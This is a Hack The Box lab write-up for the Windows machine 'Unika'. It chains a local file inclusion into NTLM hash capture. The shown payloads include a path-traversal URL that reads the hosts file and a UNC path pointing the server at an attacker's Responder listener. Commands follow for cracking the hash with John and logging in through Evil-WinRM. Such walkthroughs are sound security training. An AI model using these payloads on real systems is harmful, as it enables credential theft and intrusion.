# 🖥️ Hack The Box – Unika (Windows)

**Machine Type**: Windows
**Solved By**: Akshat Nigam
**Category**: Web | LFI | WinRM | SMB | Hash Cracking
**Difficulty**: Easy to Medium

---

## 🔍 1. Initial Scanning

Once the machine was assigned, I started by scanning the target IP using Nmap to find open ports:

```bash
nmap -sC -sV -p- <target-ip>
```

### 🔓 Open Ports Identified:

* **Port 80** – HTTP (Website)
* **Port 5985** – WinRM (Windows Remote Management)

---

## 💡 2. Understanding WinRM

**WinRM (Windows Remote Management)** is a Windows service that allows remote command execution and management over the network. It’s commonly used with PowerShell.

* Port `5985` – HTTP
* Port `5986` – HTTPS

---

## 🌐 3. Exploring the Website

When I opened the website in a browser, I noticed a **language selection** feature.

The URL looked something like:

```
http://unika.htb/index.php?page=french.html
```

---

## 🐛 4. Identifying File Inclusion Vulnerability

The `page` parameter in the URL was dynamically loading different files. This made it a strong candidate for **Local File Inclusion (LFI)**.

I tested this by modifying the URL to try and load a sensitive Windows file:

```
http://unika.htb/index.php?page=../../../../../windows/system32/drivers/etc/hosts
```

✅ It worked – the content of the Windows `hosts` file was displayed.

This confirmed a **Local File Inclusion** vulnerability.

---

## 📄 5. Why LFI Worked

* The website used PHP’s `include()` function.
* No proper input sanitization or filtering.
* That allowed us to traverse directories and read internal system files.

LFI is a powerful bug, but simply reading files is just the start.

---

## 🎣 6. LFI to SMB Hash Capture (NetNTLMv2)

Instead of just reading files, I went further:

* I tricked the web server into trying to load a file from **my attacker machine**.
* This forces the **Windows server to connect back to me using SMB**.
* When it does this, Windows automatically sends a login hash (NetNTLMv2).

---

## 🧰 7. Capturing Hash with Responder

To capture the hash, I ran **Responder** on my machine:

```bash
sudo responder -I <your-network-interface>
```

Then, triggered the LFI like:

```
http://unika.htb/index.php?page=\\<your-ip>\share
```

Boom 💥 – the target sent me an NTLM hash.

---

## 🔓 8. Cracking the NTLM Hash

Now I needed to crack the captured hash to get the **administrator password**.

I used **John the Ripper** with the popular `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Eventually, I got the password: `P@ssw0rd123!` (example)

---

## 🔐 9. Accessing Target via WinRM

With credentials in hand, I used **Evil-WinRM** to get a remote PowerShell session:

```bash
evil-winrm -i <target-ip> -u administrator -p <password>
```

🎉 This gave me full access to the target machine via PowerShell.

---

## ✅ Summary

| Step | Description                                   |
| ---- | --------------------------------------------- |
| 1    | Scanned open ports (HTTP & WinRM)             |
| 2    | Discovered LFI via `page` parameter           |
| 3    | Used LFI to read system files                 |
| 4    | Redirected file inclusion to attacker via SMB |
| 5    | Captured NetNTLMv2 hash with Responder        |
| 6    | Cracked hash using John and rockyou.txt       |
| 7    | Logged in using Evil-WinRM                    |

---

## 🏁 Outcome

* ✅ LFI Discovered
* ✅ NTLM Hash Captured
* ✅ Password Cracked
* ✅ Admin Access via Evil-WinRM

---

This was a great example of how a simple LFI can be chained into full system compromise using SMB and hash cracking. 💥
